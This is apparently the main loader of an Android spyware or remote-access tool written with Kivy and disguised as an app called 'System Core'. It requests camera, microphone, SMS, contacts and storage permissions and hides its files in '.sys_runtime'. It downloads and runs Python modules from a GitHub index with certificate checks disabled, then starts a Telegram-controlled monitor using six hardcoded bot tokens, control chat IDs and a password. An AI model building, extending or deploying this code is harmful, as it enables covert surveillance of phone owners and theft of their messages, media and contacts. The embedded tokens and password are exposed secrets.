# -*- coding: utf-8 -*-
import os, sys, threading, importlib, requests, traceback, gc, time
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()

# ✅ مسح الملفات القديمة التي قد تحتوي على كود غير متوافق (خاصة مع حذف OpenCV)
for old_file in ["monitor.py", "telegram_ui.py", "commands.py", "media_scanner.py", "gallery_browser.py"]:
    file_path = os.path.join(R, old_file)
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass

if R not in sys.path:
    sys.path.insert(0, R)

def _perms():
    """طلب كافة الصلاحيات اللازمة للعمل في الخلفية وعلى أندرويد 13+"""
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.WAKE_LOCK,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO"
        ])
    except:
        pass

RAW_INDEX = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"

class CoreApp(App):
    def build(self):
        _perms()
        self.title = "System Core"
        layout = BoxLayout(orientation='vertical', spacing=5)
        self.log = TextInput(text="", readonly=True,
                             background_color=(0.02,0.02,0.02,1),
                             foreground_color=(0.3,0.9,0.3,1),
                             font_size='10sp')
        btns = BoxLayout(size_hint=(1,0.08), spacing=5)
        copy_btn = Button(text="📋 COPY", background_color=(0.2,0.4,0.6,1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6,0.2,0.2,1))
        clear_btn.bind(on_press=self._clear)
        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)
        layout.add_widget(self.log)
        layout.add_widget(btns)
        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, _):
        Clipboard.copy(self.log.text)
        self._log("Log copied")

    def _clear(self, _):
        self.log.text = ""

    def _log(self, msg, lvl="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        def upd(dt):
            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
            if len(self.log.text) > 15000:
                self.log.text = self.log.text[-8000:]
            self.log.cursor = (0, len(self.log.text))
        Clock.schedule_once(upd, 0)

    def _download(self, url, name):
        for i in range(3):
            try:
                self._log(f"DL {name} ({i+1}/3)")
                r = requests.get(f"{url}?v={int(time.time())}", timeout=20, verify=False)
                if r.status_code == 200 and len(r.text) > 500:
                    with open(os.path.join(R, name), 'w', encoding='utf-8') as f:
                        f.write(r.text)
                    self._log(f"✅ {name} saved")
                    return True
            except Exception:
                time.sleep(2)
        self._log(f"❌ {name} failed", "ERROR")
        return False

    def _start(self, _):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        self._log("🚀 Core starting", "BOOT")

        # 1. جلب قائمة الملفات المحدثة من GitHub
        all_files = []
        try:
            r = requests.get(RAW_INDEX, timeout=15, verify=False)
            if r.status_code == 200:
                all_files = r.json().get('files', [])
                self._log(f"📄 Found {len(all_files)} files in index")
            else:
                self._log(f"Index fetch failed: {r.status_code}", "ERROR")
        except Exception as e:
            self._log(f"Index error: {e}", "ERROR")

        # 2. تحميل كل ملف (تحديث هوائي OTA)
        for file_url in all_files:
            filename = file_url.split('/')[-1]
            if filename == "main.py":
                continue
            self._download(file_url, filename)

        # 3. حذف الموديولات القديمة من الذاكرة لضمان تحميل النسخ الجديدة
        for mod in list(sys.modules.keys()):
            if mod in ["monitor", "telegram_ui", "commands", "media_scanner", "gallery_browser", "camera_analyzer"]:
                del sys.modules[mod]

        importlib.invalidate_caches()
        gc.collect()

        # 4. تشغيل النظام الأساسي
        try:
            import monitor, telegram_ui, commands
            importlib.reload(monitor)
            importlib.reload(telegram_ui)
            importlib.reload(commands)

            mon = monitor.M()
            mon.bots = [
                "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
                "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
                "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
                "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
                "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
                "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
            ]
            mon.ctrl = -1003365166986
            mon.vlt = -1003787520015
            mon.pw = "Zaen123@123@"          # كلمة السر الموحدة

            # إنشاء واجهة التلغرام
            ui = telegram_ui.T(mon)
            mon.cb_h = lambda d, cid, cbq: commands.ex(d, ui, mon, cid, cbq)

            # ترتيب التشغيل: واجهة التلغرام أولاً ثم المونيتور (ليتمكن من التسجيل التلقائي)
            ui.start()
            mon.start()

            self._log("🎉 SYSTEM ONLINE", "SUCCESS")
            self._log(f"Device ID: {mon.did} | Model: {mon.dmd}")

        except Exception as e:
            self._log(f"FATAL: {e}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")

if __name__ == '__main__':
    CoreApp().run()
